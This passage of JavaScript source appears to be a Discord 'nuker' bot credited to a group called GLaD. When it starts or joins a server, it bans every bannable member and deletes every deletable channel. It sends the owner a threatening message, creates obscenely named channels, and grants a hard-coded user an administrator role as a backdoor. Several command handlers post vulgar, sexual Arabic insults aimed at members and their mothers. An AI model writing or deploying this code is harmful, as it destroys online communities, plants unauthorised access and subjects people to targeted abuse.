        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});









// الكتابة لما يبدي التهكير 
const { Client } = require('discord.js');
const client = new Client();
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
 
  await guild.owner.send(' كلان جلاد لا يرحم لا صغيرا ولا كبيرا بل يشنق الكلاب تم شنق وقتل سيرفرك من قبل كلان [GLaD]').catch(e => { return void e; });
 
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('GLaD-ينيككم', 'text');
 
      await guild.createChannel('GLaD ينيككم', 'voice');
 
 
 
}
 
LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by YzhF1");
  console.log("");
  console.log("-------------------------------------------------------------");
 
});
 
LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});
 
LOka.on('guildMemberAdd', member => {
   
            if (member.id === "?? ?? ???") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM",
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });

 

// توكين البوت 
LOka.login(process.env.BOT_TOKEN);
